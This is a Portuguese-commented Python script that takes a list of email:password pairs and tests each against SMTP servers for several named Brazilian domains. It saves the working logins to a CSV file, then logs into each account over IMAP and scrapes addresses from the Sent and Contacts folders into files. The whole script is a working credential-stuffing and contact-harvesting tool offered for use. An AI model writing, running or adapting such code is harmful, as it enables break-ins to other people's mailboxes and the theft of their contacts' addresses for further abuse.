#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import asyncio, csv, ssl, re, sys, os
from imapclient import IMAPClient
import aiosmtplib
from tqdm import tqdm

# ---------- CONFIG ----------
SMTP_HOSTS = {
    # adicione mais se quiser hard-coded, ou deixe vazio para MX auto
    "task.com.br": ("smtp.task.com.br", 587),
    "mcanet.com.br": ("smtp.mcanet.com.br", 587),
    "viagee.com.br": ("smtp.viagee.com.br", 587),
}
IMAP_HOSTS = {
    "task.com.br": "imap.task.com.br",
    "mcanet.com.br": "imap.mcanet.com.br",
    "viagee.com.br": "imap.viagee.com.br",
}
# ---------------------------

def dominio(email):
    return email.split("@")[1].lower()

async def testa_smtp(email, pwd):
    dom = dominio(email)
    host, port = SMTP_HOSTS.get(dom), 587
    if not host:
        # fallback genérico - smtp.dominio
        host = f"smtp.{dom}"
    try:
        await aiosmtplib.send(
            "test@example.com",  # de (não usado)
            ["test@example.com"],  # para (não usado)
            hostname=host,
            port=port,
            username=email,
            password=pwd,
            use_tls=False,  # STARTTLS
            timeout=10
        )
        return True
    except aiosmtplib.SMTPAuthenticationError:
        return False
    except Exception:
        return False

def extrai_emails(text):
    # regex simples p/EMAIL
    return list(set(re.findall(r'[\w\.-]+@[\w\.-]+\.\w{2,}', text, re.I)))

def pega_contatos_imap(email, pwd):
    dom = dominio(email)
    imap_host = IMAP_HOSTS.get(dom, f"imap.{dom}")
    try:
        with IMAPClient(imap_host, ssl=True, ssl_context=ssl.create_default_context()) as c:
            c.login(email, pwd)
            pastas = c.list_folders()
            alvos = ["Enviados", "Sent", "INBOX/Sent", "Contatos", "Contacts", "INBOX/Contatos"]
            contatos = set()
            for name, sep, nome_utf in pastas:
                nome_pasta = nome_utf.decode()
                if any(a in nome_pasta for a in alvos):
                    c.select_folder(nome_pasta)
                    msgs = c.search()
                    if not msgs:
                        continue
                    for msgid in msgs:
                        header = c.fetch([msgid], [b'RFC822.HEADER'])
                        raw = header[msgid][b'RFC822.HEADER'].decode(errors='ignore')
                        contatos.update(extrai_emails(raw))
            return sorted(contatos)
    except Exception:
        return []

async def main(caminho):
    with open(caminho) as f:
        pares = [l.strip() for l in f if ":" in l]
    validos = []
    for linha in tqdm(pares, desc="SMTP test"):
        email, pwd = linha.split(":", 1)
        ok = await testa_smtp(email, pwd)
        if ok:
            validos.append((email, pwd))
    # salva hits
    with open("validos.csv", "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["email", "senha"])
        writer.writerows(validos)
    print(f"[+] {len(validos)} logins OK salvos em validos.csv")
    # agora IMAP / contatos
    for email, pwd in validos:
        contatos = pega_contatos_imap(email, pwd)
        arquivo = f"contatos_{email.replace('@','_at_')}.txt"
        with open(arquivo, "w", encoding="utf-8") as f:
            f.write("\n".join(contatos))
        print(f"[+] {email} -> {len(contatos)} contatos → {arquivo}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: python lava_tudo.py lista_email_senha.txt")
        sys.exit(1)
    asyncio.run(main(sys.argv[1]))
